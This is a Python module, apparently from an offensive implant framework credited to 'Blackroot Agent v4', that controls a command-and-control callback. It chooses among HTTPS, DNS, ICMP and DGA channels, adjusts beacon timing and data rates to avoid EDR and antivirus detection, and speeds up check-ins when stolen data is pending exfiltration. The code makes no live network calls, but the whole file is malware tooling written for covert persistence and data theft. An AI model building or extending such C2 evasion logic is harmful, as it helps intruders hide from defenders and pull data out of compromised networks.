"""
C2 CALLBACK WITH UNIFIED REASONING V2
======================================

Intelligent C2 callback that uses the unified causal reasoner for:
- Adaptive heartbeat frequency (confident → fast, uncertain → slow)
- Channel selection (strategy-aware and risk-adjusted)
- Decision transparency (detailed logging of reasoning)

Author: Blackroot Agent v4
Date: April 6, 2026
"""

from dataclasses import dataclass
from typing import Dict, Tuple, Optional
from datetime import datetime, timedelta
from enum import Enum
import json

from world_state import WorldState, OperationalPhase
from unified_causal_reasoner_v2 import UnifiedCausalReasonerV2


class C2Channel(Enum):
    """Available C2 communication channels"""
    HTTPS = "https"      # Fast, high detection risk
    DNS = "dns"          # Slow, low detection risk
    HTTP = "http"        # Medium everything
    ICMP = "icmp"        # Rare, slow
    DGA = "dga"          # Fallback, very slow


@dataclass
class C2Decision:
    """Decision about C2 communication parameters"""
    channel: Optional[C2Channel]
    heartbeat_seconds: int      # How often to check in
    data_rate_mbps: float       # Max throughput
    use_obfuscation: bool       # Add noise
    fallback_channel: Optional[C2Channel] = None
    reasoning: str = ""
    confidence: float = 0.5
    risk_assessment: Optional[Dict] = None
    strategy: str = ""
    
    def to_dict(self) -> Dict:
        """Serialize for transmission"""
        return {
            "channel": self.channel.value if self.channel else "silence",
            "heartbeat_seconds": self.heartbeat_seconds,
            "data_rate_mbps": self.data_rate_mbps,
            "use_obfuscation": self.use_obfuscation,
            "fallback_channel": self.fallback_channel.value if self.fallback_channel else None,
            "timestamp": datetime.now().isoformat(),
        }


class IntelligentC2Callback:
    """
    Adaptive C2 callback using unified causal reasoning.
    
    Makes intelligent decisions about:
    - How often to phone home (confidence + uncertainty)
    - Which channel to use (risk + strategy)
    - How much to transmit (strategy + resources)
    - When to go silent (abort conditions)
    
    All decisions are logged for transparency.
    """
    
    def __init__(self, agent_id: str = "agent_001"):
        self.agent_id = agent_id
        self.reasoner = UnifiedCausalReasonerV2()
        self.decision_log = []
        self.last_decision = None
        self.last_decision_time = None
        self.callbacks_since_decision = 0
    
    def decide_callback_parameters(
        self,
        current_threat_level: float,
        environment_detection: Dict,
        exfil_pending: bool = False,
        error_recovery: bool = False,
    ) -> C2Decision:
        """
        Make intelligent decision about C2 callback parameters.
        
        Args:
            current_threat_level: 0-1 (0=safe, 1=critical)
            environment_detection: {edr_detected, av_present, network_segmented, ...}
            exfil_pending: Is there data waiting to exfil?
            error_recovery: Is this a recovery from connection error?
        
        Returns:
            C2Decision with all parameters and reasoning
        """
        
        # =====================================================================
        # STEP 1: UPDATE WORLD STATE
        # =====================================================================
        self._update_world_state(current_threat_level, environment_detection)
        
        # =====================================================================
        # STEP 2: MAKE UNIFIED DECISION
        # =====================================================================
        # Use LATERAL_MOVEMENT phase for C2 decisions (maintain presence/comms)
        decision = self.reasoner.decide(
            phase=OperationalPhase.LATERAL_MOVEMENT,
            options=[
                "c2_https_10s",
                "c2_https_60s",
                "c2_https_300s",
                "c2_dns_60s",
                "c2_dns_300s",
                "c2_icmp_600s",
                "c2_silence",
            ]
        )
        
        # =====================================================================
        # STEP 3: PARSE DECISION
        # =====================================================================
        c2_decision = self._parse_decision_to_c2_params(
            decision,
            exfil_pending,
            error_recovery,
        )
        
        # =====================================================================
        # STEP 4: LOG DECISION (TRANSPARENCY)
        # =====================================================================
        self._log_decision(c2_decision, decision)
        
        # =====================================================================
        # STEP 5: RECORD FOR EXECUTION
        # =====================================================================
        self.last_decision = c2_decision
        self.last_decision_time = datetime.now()
        self.callbacks_since_decision = 0
        
        return c2_decision
    
    def _update_world_state(
        self,
        threat_level: float,
        environment_detection: Dict,
    ):
        """Update reasoner's world state from current conditions"""
        
        # Set threat level as risk
        self.reasoner.world.risk.detection_probability = threat_level
        
        # Update environment knowledge
        self.reasoner.world.update_environment_knowledge({
            "edr_detected": environment_detection.get("edr_detected", False),
            "av_present": environment_detection.get("av_present", False),
            "network_segmentation": environment_detection.get("network_segmented", 0.5),
            "uncertainty": environment_detection.get("uncertainty", 0.5),
        })
    
    def _parse_decision_to_c2_params(
        self,
        decision,
        exfil_pending: bool,
        error_recovery: bool,
    ) -> C2Decision:
        """
        Translate unified reasoner decision into C2 parameters.
        
        Decision options like "c2_https_60s" → C2Decision with channel, heartbeat, etc.
        """
        
        choice = decision.choice
        confidence = decision.confidence
        strategy = self.reasoner.strategy_engine.choose(self.reasoner.world)
        
        # Parse choice
        if choice == "c2_silence":
            return C2Decision(
                channel=None,  # type: ignore
                heartbeat_seconds=0,
                data_rate_mbps=0,
                use_obfuscation=True,
                reasoning="SILENCE: Risk too high, suspending all C2",
                confidence=confidence,
                strategy=strategy.value,
            )
        
        # Extract channel and interval from choice
        parts = choice.split("_")
        channel_type = parts[1]  # "https", "dns", "icmp"
        interval = int(parts[2].rstrip("s"))  # 10, 60, 300, 600
        
        # Map to C2 channel
        channel_map = {
            "https": C2Channel.HTTPS,
            "dns": C2Channel.DNS,
            "http": C2Channel.HTTP,
            "icmp": C2Channel.ICMP,
        }
        channel = channel_map.get(channel_type, C2Channel.HTTPS)
        
        # Adjust heartbeat based on conditions
        heartbeat = self._adjust_heartbeat(
            base_heartbeat=interval,
            confidence=confidence,
            exfil_pending=exfil_pending,
            error_recovery=error_recovery,
        )
        
        # Adjust data rate based on strategy
        data_rate = self._adjust_data_rate(
            channel=channel,
            strategy=strategy.value,
            risk=self.reasoner.world.risk.total_exposure(),
        )
        
        # Determine fallback
        fallback = self._select_fallback(channel)
        
        # Build reasoning
        reasoning = self._build_reasoning(
            choice=choice,
            confidence=confidence,
            strategy=strategy.value,
            decision=None,
        )
        
        return C2Decision(
            channel=channel,
            heartbeat_seconds=heartbeat,
            data_rate_mbps=data_rate,
            use_obfuscation=True,
            fallback_channel=fallback,
            reasoning=reasoning,
            confidence=confidence,
            strategy=strategy.value,
            risk_assessment={
                "detection_probability": self.reasoner.world.risk.detection_probability,
                "total_exposure": self.reasoner.world.risk.total_exposure(),
                "uncertainty": self.reasoner.world.environment.uncertainty,
            }
        )
    
    def _adjust_heartbeat(
        self,
        base_heartbeat: int,
        confidence: float,
        exfil_pending: bool,
        error_recovery: bool,
    ) -> int:
        """
        Adjust reported heartbeat based on conditions.
        
        - High confidence: Use as-is (we know the environment)
        - Low confidence: Increase interval (be cautious)
        - Exfil pending: Decrease interval (need to move data)
        - Error recovery: Decrease interval (quickly re-establish)
        """
        
        adjusted = base_heartbeat
        
        # Confidence adjustment
        if confidence < 0.4:
            # Low confidence, extend heartbeat (be cautious)
            adjusted = int(adjusted * 2.0)
        elif confidence > 0.7:
            # High confidence, can be aggressive
            adjusted = int(adjusted * 0.8)
        
        # Exfil adjustment
        if exfil_pending:
            adjusted = int(adjusted * 0.5)  # Double frequency
        
        # Error recovery adjustment
        if error_recovery:
            adjusted = int(adjusted * 0.7)  # Check in faster
        
        return adjusted
    
    def _adjust_data_rate(
        self,
        channel: C2Channel,
        strategy: str,
        risk: float,
    ) -> float:
        """
        Adjust data rate based on channel, strategy, and risk.
        
        Channel limitations:
          - HTTPS: 1000 Mbps (theoretical, throttled)
          - DNS: 10 Mbps (limited by DNS)
          - ICMP: 1 Mbps (very limited)
          - DGA: 0.1 Mbps (extremely slow)
        
        Strategy multipliers:
          - AGGRESSIVE_SPEED: Full speed
          - STEALTH_LONG_GAME: 50% speed
          - SURVIVAL: Minimum speed
        
        Risk multipliers:
          - Risk < 0.3: Full speed
          - Risk 0.3-0.6: 70% speed
          - Risk > 0.6: 30% speed
        """
        
        # Base rate by channel
        base_rates = {
            C2Channel.HTTPS: 1000.0,
            C2Channel.HTTP: 500.0,
            C2Channel.DNS: 10.0,
            C2Channel.ICMP: 1.0,
            C2Channel.DGA: 0.1,
        }
        base = base_rates.get(channel, 100.0)
        
        # Strategy multiplier
        strategy_multipliers = {
            "AGGRESSIVE_SPEED": 1.0,
            "STEALTH_LONG_GAME": 0.5,
            "LATERAL_THEN_EXFIL": 0.8,
            "PERSISTENCE_BUILD": 0.6,
            "SURVIVAL": 0.2,
            "DYNAMIC": 0.7,
        }
        strategy_mult = strategy_multipliers.get(strategy, 0.7)
        
        # Risk multiplier
        if risk < 0.3:
            risk_mult = 1.0
        elif risk < 0.6:
            risk_mult = 0.7
        else:
            risk_mult = 0.3
        
        final_rate = base * strategy_mult * risk_mult
        return final_rate
    
    def _select_fallback(self, primary: C2Channel) -> C2Channel:
        """Select fallback channel if primary fails"""
        
        fallback_chain = {
            C2Channel.HTTPS: C2Channel.HTTP,
            C2Channel.HTTP: C2Channel.DNS,
            C2Channel.DNS: C2Channel.ICMP,
            C2Channel.ICMP: C2Channel.DGA,
            C2Channel.DGA: C2Channel.DNS,
        }
        
        return fallback_chain.get(primary, C2Channel.DNS)
    
    def _build_reasoning(
        self,
        choice: str,
        confidence: float,
        strategy: str,
        decision,
    ) -> str:
        """Build human-readable reasoning for decision"""
        
        lines = [
            f"C2 Decision: {choice}",
            f"Confidence: {confidence:.0%}",
            f"Strategy: {strategy}",
            f"Risk: {self.reasoner.world.risk.total_exposure():.0%}",
            f"Uncertainty: {self.reasoner.world.environment.uncertainty:.0%}",
        ]
        
        if confidence < 0.5:
            lines.append("⚠️  Low confidence - extended heartbeat for caution")
        elif confidence > 0.7:
            lines.append("✓ High confidence - can be aggressive")
        
        return " | ".join(lines)
    
    def _log_decision(self, c2_decision: C2Decision, unified_decision):
        """
        Log decision for transparency and audit trail.
        
        This creates a complete record of:
        - What was decided
        - Why it was decided
        - What the conditions were
        - What the confidence level is
        """
        
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "agent_id": self.agent_id,
            
            # Decision details
            "channel": c2_decision.channel.value if c2_decision.channel else "silence",
            "heartbeat_seconds": c2_decision.heartbeat_seconds,
            "data_rate_mbps": c2_decision.data_rate_mbps,
            "fallback_channel": c2_decision.fallback_channel.value if c2_decision.fallback_channel else None,
            
            # Intelligence details
            "confidence": f"{unified_decision.confidence:.0%}",
            "uncertainty_mode": unified_decision.uncertainty_mode,
            "uncertainty_level": f"{unified_decision.uncertainty_level:.0%}",
            "strategy": c2_decision.strategy,
            
            # Reasoning
            "reasoning": c2_decision.reasoning,
            "risk_assessment": c2_decision.risk_assessment,
            
            # Fatigue information
            "fatigue_adjusted": unified_decision.fatigue_adjusted,
            "original_winner": unified_decision.original_winner,
            
            # Confidence breakdown
            "confidence_sources": unified_decision.confidence_breakdown,
        }
        
        self.decision_log.append(log_entry)
        
        # Print for real-time transparency
        self._print_decision_log(log_entry)
    
    def _print_decision_log(self, log_entry: Dict):
        """Print decision to console for operator visibility"""
        
        print("\n" + "=" * 70)
        print(f"[{log_entry['timestamp']}] C2 CALLBACK DECISION")
        print("=" * 70)
        
        print(f"\n📡 Channel & Frequency:")
        print(f"  Primary: {log_entry['channel']}")
        print(f"  Heartbeat: {log_entry['heartbeat_seconds']}s")
        print(f"  Data rate: {log_entry['data_rate_mbps']:.1f} Mbps")
        if log_entry['fallback_channel']:
            print(f"  Fallback: {log_entry['fallback_channel']}")
        
        print(f"\n🧠 Intelligence:")
        print(f"  Confidence: {log_entry['confidence']}")
        print(f"  Uncertainty mode: {log_entry['uncertainty_mode']}")
        print(f"  Strategy: {log_entry['strategy']}")
        
        print(f"\n📊 Risk Assessment:")
        if log_entry['risk_assessment']:
            for key, value in log_entry['risk_assessment'].items():
                if isinstance(value, float):
                    print(f"  {key}: {value:.0%}")
                else:
                    print(f"  {key}: {value}")
        else:
            print("  No risk assessment available")
        
        print(f"\n💭 Reasoning:")
        print(f"  {log_entry['reasoning']}")
        
        if log_entry['fatigue_adjusted']:
            print(f"\n↻ Fatigue-adjusted: {log_entry['original_winner']} → {log_entry['channel']}")
        
        print()
    
    def record_callback_outcome(
        self,
        success: bool,
        error: Optional[str] = None,
        latency_ms: float = 0,
    ):
        """
        Record outcome of C2 callback for learning.
        
        This updates the reasoner's world state to learn from execution.
        """
        
        if self.last_decision is None:
            return
        
        # Determine risk delta based on outcome
        if success:
            risk_delta = 0.05  # Small risk increase from communication
        else:
            risk_delta = 0.20  # Larger risk from connection failure
        
        # Record with reasoner
        self.reasoner.execute_decision(
            self._build_decision_record(),
            {
                "success": success,
                "reason": error if error else ("Success" if success else "Connection failed"),
                "risk_delta": {"detection_probability": risk_delta},
                "latency_ms": latency_ms,
            }
        )
    
    def _build_decision_record(self):
        """Convert C2Decision back to unified decision for recording"""
        if self.last_decision is None:
            # No decision made yet, return dummy
            from unified_causal_reasoner_v2 import Decision
            return Decision(
                choice="none",
                confidence=0.0,
                variance=0.0,
                reasoning="No decision yet",
            )
        
        # Use the actual Decision class from unified reasoner
        channel_choice = self.last_decision.channel.value if self.last_decision.channel else "silence"
        
        from unified_causal_reasoner_v2 import Decision
        return Decision(
            choice=channel_choice,
            confidence=self.last_decision.confidence,
            variance=0.1,
            reasoning=self.last_decision.reasoning,
        )
    
    def get_decision_history(self, limit: int = 10) -> str:
        """
        Get formatted decision history for transparency.
        
        Shows last N decisions with full reasoning.
        """
        
        if not self.decision_log:
            return "No decisions yet"
        
        lines = [
            "=" * 70,
            "C2 CALLBACK DECISION HISTORY",
            "=" * 70,
        ]
        
        for entry in self.decision_log[-limit:]:
            lines.extend([
                "",
                f"[{entry['timestamp']}]",
                f"  Channel: {entry['channel']} ({entry['heartbeat_seconds']}s)",
                f"  Confidence: {entry['confidence']} | Mode: {entry['uncertainty_mode']}",
                f"  Strategy: {entry['strategy']}",
            ])
        
        return "\n".join(lines)
    
    def get_decision_stats(self) -> Dict:
        """
        Get statistics about decisions made.
        
        Shows:
        - Most used channel
        - Average confidence
        - Strategy distribution
        - Uncertainty mode distribution
        """
        
        if not self.decision_log:
            return {}
        
        channels = [e['channel'] for e in self.decision_log]
        confidences = [float(e['confidence'].rstrip('%')) / 100 for e in self.decision_log]
        strategies = [e['strategy'] for e in self.decision_log]
        modes = [e['uncertainty_mode'] for e in self.decision_log]
        
        # Count occurrences
        from collections import Counter
        
        return {
            "total_decisions": len(self.decision_log),
            "average_confidence": f"{sum(confidences) / len(confidences):.0%}",
            "most_used_channel": Counter(channels).most_common(1)[0][0],
            "most_used_strategy": Counter(strategies).most_common(1)[0][0],
            "uncertainty_modes": dict(Counter(modes)),
            "channels_used": dict(Counter(channels)),
            "strategies_used": dict(Counter(strategies)),
        }


# =============================================================================
# DEMO: C2 CALLBACK WITH TRANSPARENCY
# =============================================================================

if __name__ == "__main__":
    c2 = IntelligentC2Callback(agent_id="agent_001")
    
    print("=" * 70)
    print("INTELLIGENT C2 CALLBACK WITH UNIFIED REASONING")
    print("=" * 70)
    
    # Simulate 5 callback cycles with changing threat levels
    scenarios = [
        {
            "name": "Initial contact (safe)",
            "threat": 0.1,
            "edr_detected": False,
            "av_present": False,
            "uncertainty": 0.7,
            "exfil_pending": False,
        },
        {
            "name": "Moderate threat detected",
            "threat": 0.4,
            "edr_detected": True,
            "av_present": False,
            "uncertainty": 0.5,
            "exfil_pending": True,
        },
        {
            "name": "High threat (EDR + AV)",
            "threat": 0.7,
            "edr_detected": True,
            "av_present": True,
            "uncertainty": 0.4,
            "exfil_pending": True,
        },
        {
            "name": "Critical threat (isolation)",
            "threat": 0.9,
            "edr_detected": True,
            "av_present": True,
            "uncertainty": 0.2,
            "exfil_pending": False,
        },
        {
            "name": "Recovery attempt",
            "threat": 0.6,
            "edr_detected": False,
            "av_present": False,
            "uncertainty": 0.5,
            "exfil_pending": False,
        },
    ]
    
    for scenario in scenarios:
        decision = c2.decide_callback_parameters(
            current_threat_level=scenario["threat"],
            environment_detection={
                "edr_detected": scenario["edr_detected"],
                "av_present": scenario["av_present"],
                "network_segmented": 0.5,
                "uncertainty": scenario["uncertainty"],
            },
            exfil_pending=scenario["exfil_pending"],
        )
        
        # Simulate outcome
        success = True if scenario["threat"] < 0.8 else False
        c2.record_callback_outcome(success=success)
    
    # Show decision history and stats
    print("\n" + c2.get_decision_history())
    
    print("\n" + "=" * 70)
    print("DECISION STATISTICS")
    print("=" * 70)
    stats = c2.get_decision_stats()
    for key, value in stats.items():
        if isinstance(value, dict):
            print(f"{key}:")
            for k, v in value.items():
                print(f"  {k}: {v}")
        else:
            print(f"{key}: {value}")
